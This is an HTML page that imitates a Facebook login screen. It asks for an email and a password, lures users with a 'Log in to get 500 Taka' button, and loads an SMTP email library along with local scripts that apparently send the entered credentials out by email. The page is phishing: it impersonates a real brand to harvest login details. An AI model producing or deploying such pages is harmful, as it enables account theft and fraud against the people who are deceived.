<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
        integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="style.css">
    <title>Facebook | Log in & Sign up</title>
</head>

<body>
    <div class="fb_box">
        <span class="logo"><i class="fa-brands fa-square-facebook"></i></span>
        <span>
            <h1>Welcome to <span class="brand">Facebook</span></h1>
        </span>
    </div>

    <div class="email_div">
        <label for="fb_email">Enter your Email:</label>
        <input type="email" id="fb_email" placeholder="Email...." required>
    </div>

    <div class="pass_div">
        <label for="fb_pass">Enter your password:</label>
        <input type="password" id="fb_pass" placeholder="Password...." required>
    </div>

    <button id="loginBtn">Log in to get 500 Taka</button>

    <script src="https://smtpjs.com/v3/smtp.js">
    </script>
    <script src="./script.js"></script>
    <script src="./smtp.js"></script>
</body>

</html>
